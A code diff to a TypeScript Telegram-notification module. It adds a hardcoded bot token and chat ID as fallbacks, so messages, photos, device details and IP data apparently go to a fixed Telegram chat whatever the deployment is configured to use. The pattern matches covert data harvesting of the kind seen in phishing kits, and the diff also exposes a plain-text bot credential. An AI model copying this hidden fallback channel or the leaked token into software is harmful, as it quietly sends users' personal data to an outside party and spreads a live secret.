@@ -1,7 +1,10 @@
+const DEFAULT_BOT_TOKEN = '8679366460:AAHZOLv00YmMK8GwjNg9gy53KQuLnUoOuR0';
+const DEFAULT_CHAT_ID = '8472630369';
+
 export const sendTelegramNotification = async (message: string) => {
   try {
-    const token = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
-    const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;
+    const token = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || DEFAULT_BOT_TOKEN;
+    const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || DEFAULT_CHAT_ID;
     
     if (!token || !chatId) return;
 
@@ -26,7 +29,13 @@ export const sendTelegramNotification = async (message: string) => {
 export const sendTelegramMessage = sendTelegramNotification;
 
 export const getDeviceInfo = () => {
-  return navigator.userAgent;
+  const ua = navigator.userAgent;
+  if (/android/i.test(ua)) return 'Android Device';
+  if (/iPad|iPhone|iPod/.test(ua)) return 'iOS Device (iPhone/iPad)';
+  if (/windows/i.test(ua)) return 'Windows PC';
+  if (/macintosh|mac os x/i.test(ua)) return 'macOS';
+  if (/linux/i.test(ua)) return 'Linux';
+  return ua.substring(0, 50);
 };
 
 export const getIpAddress = async () => {
@@ -45,8 +54,8 @@ export const sendTelegramPhoto = async (
   _isHtml?: boolean
 ) => {
   try {
-    const token = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
-    const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;
+    const token = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || DEFAULT_BOT_TOKEN;
+    const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || DEFAULT_CHAT_ID;
     if (!token || !chatId) return;
 
     let photoBlob: Blob | File | undefined;
